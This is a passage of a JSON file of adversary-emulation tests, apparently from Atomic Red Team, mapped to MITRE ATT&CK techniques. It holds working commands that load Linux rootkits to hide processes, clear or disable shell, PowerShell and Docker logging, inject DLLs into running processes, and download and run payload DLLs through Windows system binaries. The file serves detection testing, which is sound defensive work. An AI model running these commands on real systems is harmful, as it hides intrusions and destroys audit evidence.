			"command": "sudo insmod #{rootkit_path}/#{rootkit_name}.ko\n",
			"cleanup_command": "sudo rmmod #{rootkit_name}\nsudo rm -rf #{rootkit_path}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1014",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Loadable Kernel Module based Rootkit",
		"auto_generated_guid": "75483ef8-f10f-444a-bf02-62eb0e48db6f",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"rootkit_source_path": {
				"description": "Path to the rootkit source. Used when prerequisites are fetched.",
				"type": "path",
				"default": "PathToAtomicsFolder/T1014/src/Linux"
			},
			"rootkit_name": {
				"description": "Module name",
				"type": "string",
				"default": "T1014"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The kernel module must exist on disk at specified location (#{rootkit_source_path}/#{rootkit_name}.ko)\n",
				"prereq_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "sudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;\ncp #{rootkit_source_path}/* /tmp/T1014\ncd /tmp/T1014; make        \nsudo cp /tmp/T1014/#{rootkit_name}.ko /lib/modules/$(uname -r)/\n[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014\nsudo depmod -a\n"
			}
		],
		"executor": {
			"command": "sudo modprobe #{rootkit_name}\n",
			"cleanup_command": "sudo modprobe -r #{rootkit_name}\nsudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko\nsudo depmod -a\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1014",
		"phases": ["defense-evasion"]
	},
	{
		"name": "dynamic-linker based rootkit (libprocesshider)",
		"auto_generated_guid": "1338bf0c-fd0c-48c0-9e65-329f18e2c0d3",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"repo": {
				"description": "Url of the github repo zip",
				"type": "string",
				"default": "https://github.com/gianlucaborello/libprocesshider/"
			},
			"rev": {
				"description": "Revision of the github repo zip",
				"type": "string",
				"default": "25e0587d6bf2137f8792dc83242b6b0e5a72b415"
			},
			"library_path": {
				"description": "Full path of the library to add to ld.so.preload",
				"type": "string",
				"default": "/usr/local/lib/libprocesshider.so"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The preload library must exist on disk at specified location (#{library_path})\n",
				"prereq_command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "mkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}\nmake\ncp libprocesshider.so #{library_path}\ncp /usr/bin/ping /usr/local/bin/evil_script.py\n"
			}
		],
		"executor": {
			"command": "echo #{library_path} | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"\n",
			"cleanup_command": "sed -i \"\\:^#{library_path}:d\" /etc/ld.so.preload\nrm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1014",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Loadable Kernel Module based Rootkit (Diamorphine)",
		"auto_generated_guid": "0b996469-48c6-46e2-8155-a17f8b6c2247",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"repo": {
				"description": "Url of the diamorphine github repo",
				"type": "string",
				"default": "https://github.com/m0nad/Diamorphine/"
			},
			"rev": {
				"description": "Revision of the github repo zip",
				"type": "string",
				"default": "898810523aa2033f582a4a5903ffe453334044f9"
			},
			"rootkit_name": {
				"description": "Module name",
				"type": "string",
				"default": "diamorphine"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
				"prereq_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "mkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}\nmake\nsudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/\nsudo depmod -a\n"
			}
		],
		"executor": {
			"command": "sudo modprobe #{rootkit_name}\nping -c 10 localhost >/dev/null & TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n",
			"cleanup_command": "kill -63 1\nsudo modprobe -r #{rootkit_name}\nsudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic\nsudo depmod -a\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1014",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Discover System Language by Registry Query",
		"auto_generated_guid": "631d4cf1-42c9-4209-8fe9-6bd4de9421be",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1614.001",
		"phases": ["discovery"]
	},
	{
		"name": "Discover System Language with chcp",
		"auto_generated_guid": "d91473ca-944e-477a-b484-0e80217cd789",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "chcp\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1614.001",
		"phases": ["discovery"]
	},
	{
		"name": "Discover System Language with locale",
		"auto_generated_guid": "837d609b-845e-4519-90ce-edc3b4b0e138",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "locale\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1614.001",
		"phases": ["discovery"]
	},
	{
		"name": "Discover System Language with localectl",
		"auto_generated_guid": "07ce871a-b3c3-44a3-97fa-a20118fdc7c9",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "localectl status\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1614.001",
		"phases": ["discovery"]
	},
	{
		"name": "Discover System Language by locale file",
		"auto_generated_guid": "5d7057c9-2c8a-4026-91dd-13b5584daa69",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check the location of the locale configuration file.\n",
				"prereq_command": "[ -f /etc/locale.conf ] || [ -f /etc/default/locale ] && exit 0 || exit 1\n",
				"get_prereq_command": "echo \"Test only valid for systems that have locale file\"\n"
			}
		],
		"executor": {
			"command": "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1614.001",
		"phases": ["discovery"]
	},
	{
		"name": "Discover System Language by Environment Variable Query",
		"auto_generated_guid": "cb8f7cdc-36c4-4ed0-befc-7ad7d24dfd7a",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if printenv command exists on the machine\n",
				"prereq_command": "[ -x \"$(command -v printenv)\" ] && exit 0 || exit 1\n",
				"get_prereq_command": "echo \"printenv command does not exist\"\nexit 1\n"
			}
		],
		"executor": {
			"command": "env | grep LANG\nprintenv LANG\nset | grep LANG\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1614.001",
		"phases": ["discovery"]
	},
	{
		"name": "Discover System Language with dism.exe",
		"auto_generated_guid": "69f625ba-938f-4900-bdff-82ada3df5d9c",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "dism.exe /online /Get-Intl\n"
		},
		"attack_technique": "T1614.001",
		"phases": ["discovery"]
	},
	{
		"name": "Discover System Language by Windows API Query",
		"auto_generated_guid": "e39b99e9-ce7f-4b24-9c88-0fbad069e6c6",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "LanguageKeyboardLayout.exe must exist on disk (default location: PathToAtomicsFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1614.001/bin/LanguageKeyboardLayout.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "PathToAtomicsFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe"
		},
		"attack_technique": "T1614.001",
		"phases": ["discovery"]
	},
	{
		"name": "Clear Bash history (rm)",
		"auto_generated_guid": "a934276e-2be5-4a36-93fd-98adbb5bd4fc",
		"input_arguments": {
			"history_path": {
				"description": "Bash history path",
				"type": "path",
				"default": "~/.bash_history"
			}
		},
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "rm #{history_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear Bash history (echo)",
		"auto_generated_guid": "cbf506a5-dd78-43e5-be7e-a46b7c7a0a11",
		"input_arguments": {
			"history_path": {
				"description": "Bash history path",
				"type": "path",
				"default": "~/.bash_history"
			}
		},
		"supported_platforms": ["linux"],
		"executor": {
			"command": "echo \"\" > #{history_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear Bash history (cat dev/null)",
		"auto_generated_guid": "b1251c35-dcd3-4ea1-86da-36d27b54f31f",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"history_path": {
				"description": "Bash history path",
				"type": "path",
				"default": "~/.bash_history"
			}
		},
		"executor": {
			"command": "cat /dev/null > #{history_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear Bash history (ln dev/null)",
		"auto_generated_guid": "23d348f3-cc5c-4ba9-bd0a-ae09069f0914",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"history_path": {
				"description": "Bash history path",
				"type": "path",
				"default": "~/.bash_history"
			}
		},
		"executor": {
			"command": "ln -sf /dev/null #{history_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear Bash history (truncate)",
		"auto_generated_guid": "47966a1d-df4f-4078-af65-db6d9aa20739",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"history_path": {
				"description": "Bash history path",
				"type": "path",
				"default": "~/.bash_history"
			}
		},
		"executor": {
			"command": "truncate -s0 #{history_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear history of a bunch of shells",
		"auto_generated_guid": "7e6721df-5f08-4370-9255-f06d8a77af4c",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear and Disable Bash History Logging",
		"auto_generated_guid": "784e4011-bd1a-4ecd-a63a-8feb278512e6",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "set +o history\necho 'set +o history' >> ~/.bashrc\n. ~/.bashrc\nhistory -c\n",
			"cleanup_command": "sed -i 's/set +o history//g' ~/.bashrc\n. ~/.bashrc\nset -o history\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Use Space Before Command to Avoid Logging to History",
		"auto_generated_guid": "53b03a54-4529-4992-852d-a00b4b7215a6",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "hostname\nwhoami\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Bash History Logging with SSH -T",
		"auto_generated_guid": "5f8abd62-f615-43c5-b6be-f780f25790a1",
		"supported_platforms": ["linux"],
		"dependencies": [
			{
				"description": "Install sshpass and create user account used for excuting\n",
				"prereq_command": "$(getent passwd testuser1 >/dev/null) && $(which sshpass >/dev/null)\n",
				"get_prereq_command": "[ \"$(uname)\" = 'FreeBSD' ] && pw useradd testuser1 -g wheel -s /bin/sh || /usr/sbin/useradd testuser1\n[ \"$(uname)\" = 'FreeBSD' ] && echo 'pwd101!' | pw mod user testuser1 -h 0 || echo -e 'pwd101!\\npwd101!' | passwd testuser1\n(which yum && yum -y install epel-release sshpass)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass)||(which pkg && pkg install -y sshpass)\n"
			}
		],
		"executor": {
			"command": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\n",
			"cleanup_command": "[ \"$(uname)\" = 'FreeBSD' ] && rmuser -y testuser1 || userdel -f testuser1\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear Docker Container Logs",
		"auto_generated_guid": "553b39f9-1e8c-47b1-abf5-8daf7b0391e9",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"command": "docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log\n",
			"elevation_required": true
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Prevent Powershell History Logging",
		"auto_generated_guid": "2f898b81-3e97-4abb-bc3f-a95138988370",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-PSReadlineOption -HistorySaveStyle SaveNothing\n",
			"name": "powershell",
			"cleanup_command": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear Powershell History by Deleting History File",
		"auto_generated_guid": "da75ae8d-26d6-4483-b0fe-700e4df4f037",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Remove-Item (Get-PSReadlineOption).HistorySavePath\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Set Custom AddToHistoryHandler to Avoid History File Logging",
		"auto_generated_guid": "1d0d9aa6-6111-4f89-927b-53e8afae7f94",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-PSReadLineOption -AddToHistoryHandler { return $false }\n",
			"cleanup_command": "Set-PSReadLineOption -AddToHistoryHandler $null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "mavinject - Inject DLL into running process",
		"auto_generated_guid": "c426dacf-575d-4937-8611-a148a86a5e61",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process_id": {
				"description": "PID of process receiving injection",
				"type": "string",
				"default": "1000"
			},
			"dll_payload": {
				"description": "DLL to inject",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n",
				"prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\"\n"
			}
		],
		"executor": {
			"command": "mavinject.exe #{process_id} /INJECTRUNNING \"#{dll_payload}\"\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Register-CimProvider - Execute evil dll",
		"auto_generated_guid": "ad2c17ed-f626-4061-b21e-b9804a6f3655",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_payload": {
				"description": "DLL to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n",
				"prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"
			}
		],
		"executor": {
			"command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"#{dll_payload}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "InfDefaultInstall.exe .inf Execution",
		"auto_generated_guid": "54ad7d5a-a1b5-472c-b6c4-f8090fb2daef",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"inf_to_execute": {
				"description": "Local location of inf file",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "INF file must exist on disk at specified location (#{inf_to_execute})\n",
				"prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf\" -OutFile \"#{inf_to_execute}\"\n"
			}
		],
		"executor": {
			"command": "InfDefaultInstall.exe \"#{inf_to_execute}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "ProtocolHandler.exe Downloaded a Suspicious File",
		"auto_generated_guid": "db020456-125b-4c8b-a4a7-487df8afb5a2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_url": {
				"description": "url to document",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft Word must be installed\n",
				"prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"\n"
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Microsoft.Workflow.Compiler.exe Payload Execution",
		"auto_generated_guid": "7cbb0f26-a4c1-4f77-b180-a009aa05637e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"xml_payload": {
				"description": "XML to execution",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218\\src\\T1218.xml"
			},
			"mwcpath": {
				"description": "Default location of Microsoft.Workflow.Compiler.exe",
				"type": "path",
				"default": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"
			},
			"mwcname": {
				"description": "Default name of microsoft.workflow.compiler.exe",
				"type": "path",
				"default": "microsoft.workflow.compiler.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": ".Net must be installed for this test to work correctly.\n",
				"prereq_command": "if (Test-Path #{mwcpath}\\#{mwcname} ) {exit 0} else {exit 1}\n",
				"get_prereq_command": "write-host \".Net must be installed for this test to work correctly.\"\n"
			}
		],
		"executor": {
			"command": "#{mwcpath}\\#{mwcname} \"#{xml_payload}\" output.txt\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions",
		"auto_generated_guid": "4cc40fd7-87b8-4b16-b2d7-57534b86b911",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"xml_payload": {
				"description": "XML to execution",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218\\src\\T1218.xml"
			},
			"renamed_binary": {
				"description": "renamed Microsoft.Workflow.Compiler",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\svchost.exe"
			},
			"mwcpath": {
				"description": "Default location of Microsoft.Workflow.Compiler.exe",
				"type": "path",
				"default": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"
			},
			"mwcname": {
				"description": "Default name of microsoft.workflow.compiler.exe",
				"type": "path",
				"default": "microsoft.workflow.compiler.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": ".Net must be installed for this test to work correctly.\n",
				"prereq_command": "if (Test-Path \"#{renamed_binary}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nCopy-Item #{mwcpath}\\#{mwcname} \"#{renamed_binary}\" -Force\n"
			}
		],
		"executor": {
			"command": "&\"#{renamed_binary}\" \"#{xml_payload}\" output.txt\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test",
		"auto_generated_guid": "9ebe7901-7edf-45c0-b5c7-8366300919db",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"module_name": {
				"description": "Specifies a temporary module name to use. If -ModuleName is not supplied, a 16-character random temporary module name is used. A PowerShell module can have any name. Because Get-VMRemoteFXPhysicalVideoAdapter abuses module load order, a module name must be specified.",
				"type": "string",
				"default": "foo"
			},
			"module_path": {
				"description": "Specifies an alternate, non-default PowerShell module path for RemoteFXvGPUDisablement.exe. If -ModulePath is not specified, the first entry in %PSModulePath% will be used. Typically, this is %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules.",
				"type": "string",
				"default": "$PWD"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHRemoteFXvGPUDisablementCommand must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "DiskShadow Command Execution",
		"auto_generated_guid": "0e1483ba-8f0c-425d-b8c6-42736e058eaa",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"txt_payload": {
				"description": "txt to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218\\src\\T1218.txt"
			},
			"dspath": {
				"description": "Default location of DiskShadow.exe",
				"type": "path",
				"default": "C:\\Windows\\System32\\diskshadow.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "txt file must exist on disk at specified location (#{txt_payload})",
				"prereq_command": "if (Test-Path \"#{txt_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{txt_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt\" -OutFile \"#{txt_payload}\"\n"
			},
			{
				"description": "DiskShadow.exe must exist on disk at specified location (#{dspath})",
				"prereq_command": "if (Test-Path #{dspath}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "echo \"DiskShadow.exe not found on disk at expected location\"\n"
			}
		],
		"executor": {
			"command": "#{dspath} -S #{txt_payload} \n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)",
		"auto_generated_guid": "49fbd548-49e9-4bb7-94a6-3769613912b8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"arbitrary_dll": {
				"description": "Path of DLL to be loaded",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1218\\bin\\calc.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "DLL to load must exist on disk as specified location (#{arbitrary_dll})\n",
				"prereq_command": "if (test-path \"#{arbitrary_dll}\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{arbitrary_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true\" -OutFile \"#{arbitrary_dll}\"\n"
			}
		],
		"executor": {
			"command": "wuauclt.exe /UpdateDeploymentProvider \"#{arbitrary_dll}\" /RunHandlerComServer\n",
			"cleanup_command": "taskkill /f /im calculator.exe > nul 2>&1",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Lolbin Gpscript logon option",
		"auto_generated_guid": "5bcda9cd-8e85-48fa-861d-b5a85d91d48c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Gpscript /logon\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Lolbin Gpscript startup option",
		"auto_generated_guid": "f8da74bb-21b8-4af9-8d84-f2c8e4a220e3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Gpscript /startup\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Lolbas ie4uinit.exe use as proxy",
		"auto_generated_guid": "13c0804e-615e-43ad-b223-2dfbacd0b0b3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"Path_inf": {
				"description": "Path to the cab file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218\\src\\ieuinit.inf"
			},
			"Path_ie4uinit": {
				"description": "Path to ie4uinit.exe",
				"type": "path",
				"default": "c:\\windows\\system32\\ie4uinit.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ieuinit.inf must exist on disk at specified location (#{Path_inf})\n",
				"prereq_command": "if (Test-Path \"#{Path_inf}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{Path_inf}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf\" -OutFile \"#{Path_inf}\"\n"
			}
		],
		"executor": {
			"command": "copy #{Path_ie4uinit} %TEMP%\\ie4uinit.exe\ncopy \"#{Path_inf}\" %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings\n",
			"cleanup_command": "del %TEMP%\\ie4uinit.exe >nul 2>&1\ndel %TEMP%\\ieuinit.inf >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "LOLBAS CustomShellHost to Spawn Process",
		"auto_generated_guid": "b1eeb683-90bb-4365-bbc2-2689015782fe",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dest_path": {
				"description": "Directory to copy files into",
				"type": "path",
				"default": "C:\\test"
			}
		},
		"executor": {
			"command": "if (-not (Test-Path #{dest_path})) {\nNew-Item -Path #{dest_path} -ItemType Directory\n} else {\nWrite-Host \"Directory #{dest_path} already exists.\" }\nCopy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"#{dest_path}\\customshellhost.exe\" -Force\nCopy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"#{dest_path}\\explorer.exe\" -Force\n#{dest_path}\\customshellhost.exe\n",
			"cleanup_command": "Remove-Item -Path #{dest_path} -Recurse -Force\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1218",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Provlaunch.exe Executes Arbitrary Command via Registry Key",
		"auto_generated_guid": "ab76e34f-28bf-441f-a39c-8db4835b89cc",
		"supported_platforms": ["windows"],
		"executor": {
